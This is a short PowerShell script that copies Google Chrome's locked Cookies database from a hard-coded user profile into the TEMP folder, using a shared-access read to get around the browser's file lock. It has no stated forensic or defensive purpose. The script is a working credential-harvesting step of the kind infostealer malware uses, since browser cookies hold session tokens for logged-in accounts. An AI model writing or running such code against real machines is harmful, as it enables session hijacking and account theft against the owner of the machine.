function Copy-LockedFile($src, $dst) {
    $srcStream = [System.IO.File]::Open($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    $dstStream = [System.IO.File]::Create($dst)
    $srcStream.CopyTo($dstStream)
    $srcStream.Close()
    $dstStream.Close()
}

$temp = "$env:TEMP\cookies_Default.db"
Copy-LockedFile "C:\Users\NT\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" $temp
$info = Get-Item $temp
Write-Host "Default Cookies copied successfully! Size: $($info.Length) bytes"
